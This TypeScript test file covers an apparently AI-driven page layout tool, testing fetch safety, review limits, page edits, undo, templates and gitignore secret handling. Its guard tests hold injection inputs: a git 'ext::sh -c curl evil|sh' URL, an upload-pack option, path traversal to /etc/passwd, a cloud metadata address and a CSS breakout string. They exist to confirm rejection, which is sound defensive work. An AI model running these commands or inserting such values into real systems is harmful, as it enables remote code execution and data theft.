// Guard tests: web_fetch safety + review round cap. Run: npm test
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, mkdirSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

process.env.GEMINI_API_KEY ??= "test-key-not-used";

const { fetchWeb, resetFetchBudget } = await import("./web-fetch.ts");
const { runReview, RoundLimitError } = await import("./review.ts");
const { Project } = await import("./project.ts");
const { loadConfig } = await import("./config.ts");

function tempProject(): InstanceType<typeof Project> {
  const dir = mkdtempSync(join(tmpdir(), "pc-test-"));
  writeFileSync(join(dir, "brief.md"), "# test brief");
  // Project resolves relative to REPO_ROOT; absolute paths pass through resolve() unchanged.
  return new Project(dir);
}

const deadBackend = {
  renderPdf: async () => assert.fail("render must not be called"),
  screenshot: async () => assert.fail("screenshot must not be called"),
  withPage: async () => assert.fail("browser must not be reached"),
  close: async () => {},
} as any;

const config = loadConfig();

test("web_fetch rejects non-http schemes", async () => {
  const p = tempProject();
  resetFetchBudget(p);
  await assert.rejects(fetchWeb(p, deadBackend, config, "file:///etc/passwd"), /Only http/);
});

test("web_fetch rejects localhost and private addresses", async () => {
  const p = tempProject();
  resetFetchBudget(p);
  await assert.rejects(fetchWeb(p, deadBackend, config, "http://localhost:8080/x"), /local/);
  await assert.rejects(fetchWeb(p, deadBackend, config, "https://127.0.0.1/x"), /private|local/i);
  await assert.rejects(fetchWeb(p, deadBackend, config, "https://192.168.1.10/x"), /private/);
  await assert.rejects(fetchWeb(p, deadBackend, config, "https://169.254.169.254/meta-data"), /private/);
});

test("web_fetch enforces per-run budget", async () => {
  const p = tempProject();
  resetFetchBudget(p);
  writeFileSync(join(p.fetchedDir, ".budget.json"), JSON.stringify({ used: config.webFetch.maxFetchesPerRun }));
  await assert.rejects(fetchWeb(p, deadBackend, config, "https://example.com/"), /budget exhausted/);
});

test("review refuses to run past the round cap", async () => {
  const p = tempProject();
  mkdirSync(p.reviewDir, { recursive: true });
  for (let i = 1; i <= config.reviewer.maxRounds; i++) {
    writeFileSync(join(p.reviewDir, `round-${i}.json`), JSON.stringify({ verdict: "revise", issues: [] }));
  }
  await assert.rejects(runReview(p, config), RoundLimitError);
});

test("review requires a rendered proof before reviewing", async () => {
  const p = tempProject();
  await assert.rejects(runReview(p, config), /render tool before/);
});

const { safeRelPath, pageDims } = await import("./project.ts");
const { setElementStyle, getElementStyle, insertElement, setImageGeometry, setElementProps, deleteImage, moveElement } = await import("./page-edit.ts");
const { snapshotPage, undoPage, redoPage, historyDepth } = await import("./undo.ts");

test("insertElement adds a positioned, on-top element with NO forced rounded corners", () => {
  const p = tempProject();
  writeFileSync(p.pageHtml, `<html><body><div data-pc-id="page">x</div></body></html>`);
  assert.equal(insertElement(p, "text"), "text-1");
  let html = readFileSync(p.pageHtml, "utf8");
  assert.match(html, /data-pc-id="text-1"/);
  assert.match(html, /position:absolute/);
  assert.match(html, /z-index:50/); // sits on top of existing content
  assert.doesNotMatch(html, /border-radius/); // no forced rounded corners (user restyles via panel)
  assert.equal(insertElement(p, "text"), "text-2"); // ids don't collide
  assert.equal(insertElement(p, "rect"), "rect-1");
  html = readFileSync(p.pageHtml, "utf8");
  assert.doesNotMatch(html, /border-radius/); // a rect is a sharp box by default
});

test("setImageGeometry writes frame + inner-layer geometry atomically", () => {
  const p = tempProject();
  writeFileSync(
    p.pageHtml,
    `<html><body><div data-img-frame="hero"><img data-image-id="hero" src="x.png"></div></body></html>`,
  );
  setImageGeometry(p, "hero", { frame: { leftMm: 10, topMm: 5, widthMm: 50, heightMm: 40 }, layer: { widthMm: 80, leftMm: -5, topMm: -3 } });
  const html = readFileSync(p.pageHtml, "utf8");
  assert.match(html, /overflow:\s*hidden/); // frame clips
  assert.match(html, /width:\s*50\.0mm/); // frame width
  assert.match(html, /width:\s*80\.0mm/); // layer width
  assert.match(html, /left:\s*-5\.0mm/); // layer offset (the crop)
});

test("deleteImage removes a compiled image's whole slot; moveElement resolves image ids", () => {
  const p = tempProject();
  writeFileSync(
    p.pageHtml,
    `<html><body>` +
      `<p data-pc-id="a">A</p>` +
      `<div data-img-slot="hero"><div data-img-frame="hero"><img data-image-id="hero" src="x.png"></div></div>` +
      `<p data-pc-id="b">B</p>` +
      `</body></html>`,
  );
  // moveElement by IMAGE id moves the slot up past <p data-pc-id="a">.
  moveElement(p, "hero", "up");
  let html = readFileSync(p.pageHtml, "utf8");
  assert.ok(html.indexOf('data-img-slot="hero"') < html.indexOf('data-pc-id="a"'), "image slot moved above A");
  // deleteImage removes the slot (frame + img with it), leaving the paragraphs.
  deleteImage(p, "hero");
  html = readFileSync(p.pageHtml, "utf8");
  assert.doesNotMatch(html, /data-image-id="hero"/);
  assert.doesNotMatch(html, /data-img-slot/);
  assert.ok(html.includes('data-pc-id="a"') && html.includes('data-pc-id="b"'), "paragraphs survive");
});

test("deleteImage works on a legacy (uncompiled) image", () => {
  const p = tempProject();
  writeFileSync(p.pageHtml, `<html><body><div class="crop"><img data-image-id="hero" src="x.png"></div></body></html>`);
  deleteImage(p, "hero");
  assert.doesNotMatch(readFileSync(p.pageHtml, "utf8"), /data-image-id/);
});

const { gitClone } = await import("./git-sync.ts");
const { confineToRoot } = await import("./session.ts");

test("confineToRoot keeps the agent's write/edit inside the project dir", () => {
  const root = "/tmp/proj";
  assert.equal(confineToRoot(root, "/tmp/proj/page.html"), "/tmp/proj/page.html");
  assert.equal(confineToRoot(root, "/tmp/proj/images/x/v1.png"), "/tmp/proj/images/x/v1.png");
  assert.throws(() => confineToRoot(root, "/tmp/proj/../evil.txt"), /Refused/); // .. escape
  assert.throws(() => confineToRoot(root, "/Users/x/Library/LaunchAgents/x.plist"), /Refused/); // absolute
  assert.throws(() => confineToRoot(root, "/tmp/proj-sibling/x"), /Refused/); // prefix, not a child
});

test("gitClone rejects protocol/argument injection", async () => {
  // ext:: transport = arbitrary command execution; leading - = option injection.
  await assert.rejects(gitClone("ext::sh -c 'curl evil|sh'", "/tmp/x"), /git remote URL/);
  await assert.rejects(gitClone("--upload-pack=/bin/sh", "/tmp/x"), /git remote URL/);
  await assert.rejects(gitClone("file:///etc", "/tmp/x"), /git remote URL/);
  await assert.rejects(gitClone("https://github.com/x/y.git", "-oops"), /Invalid destination/);
  // A well-formed https URL passes validation (then fails only because the dest exists).
  await assert.rejects(gitClone("https://github.com/x/y.git", "/"), /already exists/);
});

test("setElementProps whitelists CSS and rejects injection", () => {
  const p = tempProject();
  writeFileSync(p.pageHtml, `<html><body><h1 data-pc-id="t">Hi</h1></body></html>`);
  setElementProps(p, "t", { "font-size": "24pt", color: "#ff0000", "border-radius": "3mm" });
  const html = readFileSync(p.pageHtml, "utf8");
  assert.match(html, /font-size:\s*24pt/);
  assert.match(html, /color:\s*#ff0000/);
  // Not on the whitelist → rejected.
  assert.throws(() => setElementProps(p, "t", { position: "fixed" }), /not allowed/);
  // Value that could break out of the style attribute → rejected.
  assert.throws(() => setElementProps(p, "t", { color: "red;} body{display:none" }), /Unsafe/);
  // Empty string removes a property.
  setElementProps(p, "t", { "font-size": "" });
  assert.doesNotMatch(readFileSync(p.pageHtml, "utf8"), /font-size/);
});

test("pageDims resolves named sizes, slide presets, orientation and custom", () => {
  const base = { pages: 1, widthMm: null, heightMm: null };
  assert.deepEqual(pageDims({ ...base, pageSize: "A4", orientation: "portrait" }), { w: 210, h: 297 });
  assert.deepEqual(pageDims({ ...base, pageSize: "A4", orientation: "landscape" }), { w: 297, h: 210 });
  // slide presets are landscape-first — landscape orientation keeps them wide
  assert.deepEqual(pageDims({ ...base, pageSize: "Slide 16:9", orientation: "landscape" }), { w: 338.7, h: 190.5 });
  // custom dims are literal, orientation is baked in
  assert.deepEqual(pageDims({ ...base, pageSize: "Custom", orientation: "portrait", widthMm: 300, heightMm: 100 }), { w: 300, h: 100 });
  // unknown size falls back to A4
  assert.deepEqual(pageDims({ ...base, pageSize: "Nonsense", orientation: "portrait" }), { w: 210, h: 297 });
});

test("custom dimensions clamp through meta()", () => {
  const p = tempProject();
  p.updateMeta({ settings: { pageSize: "Custom", widthMm: 9999, heightMm: 3 } as any });
  const s = p.meta().settings;
  assert.equal(s.widthMm, 2000);
  assert.equal(s.heightMm, 50);
});

test("autoPages round-trips through meta() and defaults false", () => {
  const p = tempProject();
  assert.equal(p.meta().settings.autoPages, false, "defaults off");
  p.updateMeta({ settings: { autoPages: true } as any });
  assert.equal(p.meta().settings.autoPages, true, "persists on");
  p.updateMeta({ settings: { autoPages: false } as any });
  assert.equal(p.meta().settings.autoPages, false, "can be turned back off");
});

const { diffPages } = await import("./undo.ts");

test("diffPages names the innermost changed elements only", () => {
  const before = `<html><body><div data-pc-id="wrap"><h1 data-pc-id="title">Old</h1><p data-pc-id="sub">Same</p></div></body></html>`;
  const afterText = before.replace(">Old<", ">New<");
  assert.deepEqual(diffPages(before, afterText), ["title"]); // wrap changed too, but title is the leaf
  const afterRemoved = `<html><body><div data-pc-id="wrap"><p data-pc-id="sub">Same</p></div></body></html>`;
  assert.deepEqual(diffPages(before, afterRemoved), ["title"]); // removed element is the change
  assert.deepEqual(diffPages(before, before), []);
});

test("undo/redo restores page.html snapshots; a fresh edit clears redo", () => {
  const p = tempProject();
  writeFileSync(p.pageHtml, "<html><body>v1</body></html>");
  snapshotPage(p);
  writeFileSync(p.pageHtml, "<html><body>v2</body></html>");
  snapshotPage(p);
  writeFileSync(p.pageHtml, "<html><body>v3</body></html>");
  assert.deepEqual(historyDepth(p), { undo: 2, redo: 0 });

  undoPage(p);
  assert.ok(readFileSync(p.pageHtml, "utf8").includes("v2"));
  undoPage(p);
  assert.ok(readFileSync(p.pageHtml, "utf8").includes("v1"));
  assert.deepEqual(historyDepth(p), { undo: 0, redo: 2 });
  assert.throws(() => undoPage(p), /Nothing to undo/);

  redoPage(p);
  assert.ok(readFileSync(p.pageHtml, "utf8").includes("v2"));

  // a new edit after undo invalidates the redo branch
  snapshotPage(p);
  writeFileSync(p.pageHtml, "<html><body>v2b</body></html>");
  assert.deepEqual(historyDepth(p), { undo: 2, redo: 0 });
  assert.throws(() => redoPage(p), /Nothing to redo/);
});

test("safeRelPath blocks traversal and absolute paths, allows subfolders", () => {
  assert.equal(safeRelPath("photos/team.jpg"), "photos/team.jpg");
  assert.equal(safeRelPath("/leading/slash.md"), "leading/slash.md");
  assert.equal(safeRelPath("win\\style\\path.png"), "win/style/path.png");
  assert.throws(() => safeRelPath("../../etc/passwd"));
  assert.throws(() => safeRelPath("a/../b.md"));
  assert.throws(() => safeRelPath("a/./b.md"));
  assert.throws(() => safeRelPath(""));
});

test("project meta defaults are safe on legacy projects and clamp settings", () => {
  const p = tempProject();
  const meta = p.meta();
  assert.equal(meta.displayName, p.slug);
  assert.deepEqual(meta.settings, { pageSize: "A4", orientation: "portrait", pages: 1, autoPages: false, widthMm: null, heightMm: null, docType: "one-pager" });
  p.updateMeta({ displayName: "Nice Name", series: "s", settings: { pages: 999 } as any });
  const updated = p.meta();
  assert.equal(updated.displayName, "Nice Name");
  assert.equal(updated.settings.pages, 24); // clamped
  assert.equal(updated.settings.pageSize, "A4"); // merge kept defaults
});

const { updateCopy } = await import("./page-edit.ts");

test("updateCopy refuses to flatten structural containers", () => {
  const p = tempProject();
  writeFileSync(
    p.pageHtml,
    `<html><body><div data-pc-id="page"><h1 data-pc-id="headline">Hi</h1><p data-pc-id="sub">There</p></div></body></html>`,
  );
  // Leaf edits work…
  updateCopy(p, "headline", "New headline");
  // …but a container edit must throw instead of destroying its children.
  assert.throws(() => updateCopy(p, "page", "flattened text"), /layout container/);
  const html = readFileSync(p.pageHtml, "utf8");
  assert.ok(html.includes("New headline") && html.includes('data-pc-id="sub"'));
});

test("updateCopy treats any non-inline child as structure (the h3+p card case)", () => {
  const p = tempProject();
  writeFileSync(
    p.pageHtml,
    `<html><body>
      <div data-pc-id="card"><h3>Title</h3><p>Body copy.</p></div>
      <h1 data-pc-id="hero">Big <span class="accent">bold</span> claim</h1>
    </body></html>`,
  );
  // A card whose children are h3+p (no divs!) must still be protected…
  assert.throws(() => updateCopy(p, "card", "flat"), /layout container/);
  // …while inline formatting (span) does not block editing a real text element.
  updateCopy(p, "hero", "Bigger claim");
  const html = readFileSync(p.pageHtml, "utf8");
  assert.ok(html.includes("<h3>Title</h3>") && html.includes("Bigger claim"));
});

const { deleteElement, moveElementBefore, pageSource, writePageSource, tagElement } = await import("./page-edit.ts");

test("tagElement tags via strict child-index paths only", () => {
  const p = tempProject();
  writeFileSync(
    p.pageHtml,
    `<html><body><div data-pc-id="wrap"><div class="metric"><span>75%</span><span>caption</span></div></div></body></html>`,
  );
  // body > wrap > .metric > second span
  tagElement(p, "body > *:nth-child(1) > *:nth-child(1) > *:nth-child(2)", "metric-caption");
  const html = readFileSync(p.pageHtml, "utf8");
  assert.ok(/<span data-pc-id="metric-caption">caption<\/span>/.test(html));
  assert.throws(() => tagElement(p, "body > *:nth-child(1)", "wrap2"), /already tagged/);
  assert.throws(() => tagElement(p, "div.metric", "x"), /Invalid element path/); // free CSS rejected
  assert.throws(() => tagElement(p, "body > *:nth-child(1) > *:nth-child(1) > *:nth-child(1)", "metric-caption"), /already in use/);
  assert.throws(() => tagElement(p, "body > *:nth-child(9)", "nope"), /No element/);
});

test("element delete/move/source operations", () => {
  const p = tempProject();
  writeFileSync(
    p.pageHtml,
    `<html><head><style>b{}</style></head><body><div data-pc-id="wrap"><p data-pc-id="a">A</p><p data-pc-id="b">B</p><p data-pc-id="c">C</p></div></body></html>`,
  );
  const order = () => {
    const html = readFileSync(p.pageHtml, "utf8");
    return ["a", "b", "c"].filter((id) => html.includes(`data-pc-id="${id}"`)).sort(
      (x, y) => html.indexOf(`data-pc-id="${x}"`) - html.indexOf(`data-pc-id="${y}"`),
    ).join("");
  };
  moveElement(p, "c", "up");
  assert.equal(order(), "acb");
  moveElementBefore(p, "b", "a");
  assert.equal(order(), "bac");
  moveElement(p, "b", "up"); // already first — no-op
  assert.equal(order(), "bac");
  deleteElement(p, "a");
  assert.equal(order(), "bc");
  assert.throws(() => moveElementBefore(p, "wrap", "b"), /into itself/);
  assert.throws(() => deleteElement(p, "nope"), /No element/);
  assert.throws(() => writePageSource(p, "<div>hi</div>"), /complete HTML/);
  const src = pageSource(p);
  writePageSource(p, src); // round-trip of a valid document is accepted
  assert.equal(pageSource(p), src);
});

const { resolveImageModel, KNOWN_IMAGE_MODELS } = await import("./images.ts");

test("image model nicknames resolve to real API ids", () => {
  assert.equal(resolveImageModel("nano-banana-2"), "gemini-3.1-flash-image");
  assert.equal(resolveImageModel("Nano Banana 2"), "gemini-3.1-flash-image");
  assert.equal(resolveImageModel("nano-banana"), "gemini-2.5-flash-image");
  assert.equal(resolveImageModel("gemini-3.1-flash-image"), "gemini-3.1-flash-image"); // real ids untouched
  assert.equal(resolveImageModel("imagen-4.0-generate-001"), "imagen-4.0-generate-001");
  assert.ok(KNOWN_IMAGE_MODELS.includes("gemini-3.1-flash-image"));
});

const { Workspace } = await import("./workspace.ts");
const { saveTemplate, listTemplates, instantiateTemplate, templateBrief, deleteTemplate } = await import("./templates.ts");
const { buildSystemPrompt } = await import("./prompt.ts");

test("same name twice yields distinct unique folder ids (no cross-user collision)", () => {
  const ws = new Workspace(mkdtempSync(join(tmpdir(), "pc-ws-"))).ensure();
  const a = ws.createProject("Acme Flyer", "# a");
  const b = ws.createProject("Acme Flyer", "# b");
  assert.notEqual(a.slug, b.slug, "two 'Acme Flyer's get different folder ids");
  assert.match(a.slug, /^acme-flyer-[0-9a-z]{8}$/, "readable slug + random suffix");
  // meta.id defaults to the folder id; displayName (set by the create flow) can duplicate freely.
  const pa = new Project(a.dir, ws);
  assert.equal(pa.meta().id, a.slug, "meta.id is the folder id");
  pa.updateMeta({ displayName: "Acme Flyer" });
  const pb = new Project(b.dir, ws);
  pb.updateMeta({ displayName: "Acme Flyer" });
  assert.equal(pa.meta().displayName, pb.meta().displayName, "duplicate display names are allowed");
  assert.equal(pa.meta().id !== pb.meta().id, true, "but ids stay distinct");
});

test("templates: save from project, list, instantiate into a new project", () => {
  const ws = new Workspace(mkdtempSync(join(tmpdir(), "pc-ws-"))).ensure();
  const { dir } = ws.createProject("invoice-master", "# Brief: monthly invoice");
  const base = new Project(dir, ws);
  writeFileSync(base.pageHtml, `<html><body><table data-pc-id="line-items"><tr><td>item</td></tr></table></body></html>`);
  base.updateMeta({ settings: { pageSize: "Letter", orientation: "portrait", pages: 2 } as any });

  const info = saveTemplate(base, "Invoice", "Standard client invoice");
  assert.equal(info.slug, "invoice");
  assert.equal(info.settings.pageSize, "Letter");
  assert.throws(() => saveTemplate(base, "Invoice"), /already exists/);
  assert.equal(listTemplates(ws).length, 1);
  assert.equal(templateBrief(ws, "invoice"), "# Brief: monthly invoice\n");

  const { dir: dir2 } = ws.createProject("acme-march", "# Brief: March invoice for Acme");
  const inst = instantiateTemplate(ws, "invoice", dir2);
  assert.equal(inst.slug, "invoice");
  const p2 = new Project(dir2, ws);
  assert.ok(readFileSync(p2.pageHtml, "utf8").includes('data-pc-id="line-items"'));
  p2.updateMeta({ template: inst.slug, settings: inst.settings });
  assert.equal(p2.meta().template, "invoice");
  assert.equal(p2.meta().settings.pages, 2);

  // The system prompt flips into strict fill-in-the-data mode for templated projects.
  const prompt = buildSystemPrompt(p2, config);
  assert.ok(prompt.includes("Template contract") && prompt.includes('"invoice" template'));
  assert.ok(!buildSystemPrompt(base, config).includes("Template contract"));

  deleteTemplate(ws, "invoice");
  assert.equal(listTemplates(ws).length, 0);
  assert.throws(() => instantiateTemplate(ws, "invoice", dir2), /No such template/);
});

test("element nudge clamps offsets and round-trips through page.html", () => {
  const p = tempProject();
  writeFileSync(p.pageHtml, `<html><body><section data-pc-id="stats" style="color: red">x</section></body></html>`);
  setElementStyle(p, "stats", { translateX: 3, translateY: -2 });
  assert.deepEqual(getElementStyle(p, "stats"), { translateX: 3, translateY: -2, marginTop: null });
  setElementStyle(p, "stats", { translateX: 9999, translateY: 0, marginTop: 12 });
  const s = getElementStyle(p, "stats");
  assert.equal(s.translateX, 150); // clamped to NUDGE_LIMIT
  assert.equal(s.marginTop, 12);
  setElementStyle(p, "stats", { translateX: 0, translateY: 0, marginTop: null });
  assert.deepEqual(getElementStyle(p, "stats"), { translateX: 0, translateY: 0, marginTop: null });
  assert.throws(() => setElementStyle(p, "nope", { translateX: 1 }), /No element/);
});

test("workspace .gitignore always excludes secrets (.env, config/workspace.json)", async () => {
  const { ensureGitignore } = await import("./git-sync.ts");
  // fresh workspace: a brand-new .gitignore lists the secret paths
  const root = mkdtempSync(join(tmpdir(), "pc-gi-"));
  ensureGitignore(root);
  const fresh = readFileSync(join(root, ".gitignore"), "utf8");
  for (const secret of [".env", "config/workspace.json"]) assert.ok(fresh.includes(secret), `missing ${secret}`);
  assert.ok(!fresh.includes("config/providers.json"), "providers.json is shareable, must NOT be ignored");
  // pre-existing .gitignore that lacks .env gets it appended, existing lines preserved
  const root2 = mkdtempSync(join(tmpdir(), "pc-gi-"));
  writeFileSync(join(root2, ".gitignore"), "node_modules/\n");
  ensureGitignore(root2);
  const patched = readFileSync(join(root2, ".gitignore"), "utf8");
  assert.ok(patched.includes("node_modules/"), "existing rule preserved");
  assert.ok(patched.includes(".env"), ".env appended");
  // idempotent: a second pass makes no change
  const before = readFileSync(join(root2, ".gitignore"), "utf8");
  ensureGitignore(root2);
  assert.equal(readFileSync(join(root2, ".gitignore"), "utf8"), before, "second pass is a no-op");
});
